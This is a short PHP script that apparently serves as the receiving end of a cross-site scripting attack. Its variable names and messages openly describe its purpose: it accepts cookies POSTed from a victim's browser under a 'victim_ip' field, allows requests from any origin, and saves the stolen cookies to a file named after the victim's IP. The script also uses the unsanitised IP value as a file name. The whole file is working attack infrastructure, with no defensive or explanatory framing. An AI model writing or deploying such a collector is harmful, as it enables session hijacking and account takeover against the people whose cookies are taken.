<?php

header('Access-Control-Allow-Origin: *');

if(!empty($_POST)){
  if(isset($_POST['victim_ip'])){
    $subject = "Obtained cookies from " . $_POST['victim_ip'];
  } else {
    header("HTTP/1.1 400 Bad Request");
    exit();
  }

  if(isset($_POST['document_cookies'])){
    $message = $_POST['document_cookies'];
  } else {
    header("HTTP/1.1 400 Bad Request");
    exit();
  }

  $myfile = fopen($_POST['victim_ip'].".cky","w") or die();
  fwrite($myfile, $message."\n");
  fclose($myfile);
    header("HTTP/1.1 200 OK");
    exit();
} else {
  header("HTTP/1.1 405 Method Not Allowed");
  exit();
}

?>
